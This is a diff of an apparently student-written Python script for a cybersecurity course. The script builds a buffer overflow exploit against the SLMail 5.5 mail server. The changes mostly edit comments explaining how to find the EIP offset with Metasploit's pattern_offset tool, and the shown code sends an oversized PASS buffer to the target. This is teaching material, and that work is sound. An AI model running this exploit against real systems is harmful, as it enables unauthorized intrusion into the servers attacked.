@@ -1,11 +1,12 @@
-# Programming For Cybersecurity course - Project
-# Subject: Development of a buffer overflow exploit based on a proof of concept exploit.
+#  Programming For Cybersecurity course - Project
+#  Subject: Development of a buffer overflow exploit based on a proof of concept exploit.
 #
-# Author: Tomasz
+#  Author: Tomasz / G00398835
 #
-#  Take the hex value and identify the offset of where EIP register resides
-#  Again, Kali linus can help us: "/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 4000 -q 39694438"  (where is the hex value)
-#  Re-run the code to make sure that your offset is calculated properly and B's fill in the EIP register
+#  Take the hex value from STEP 2 and identify the offset of where EIP register resides.
+#  Again, Kali linux can help us in doing so: "/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 4000 -q 39694438"  (-q is the the hex value from STEP2 )
+#  Re-run the code trying to fill in the EIP register with something you can recognize (B in this case). This is to make sure that your offset is calculated corectly, Bs are placed 
+#  in the EIP register memory space.
 #  
 
 import sys
@@ -34,4 +35,4 @@ try:
     s.send('PASS ' + buffer + '\r\n')             # Send Password and buffer
     s.close()
 except:
-    print('There was a problem... please check if the server is vulnerable and SLMail 5.5 is running on the target.')
+    print('There was a problem! Please check your code and if the server is vulnerable and SLMail 5.5 is running on the target.')
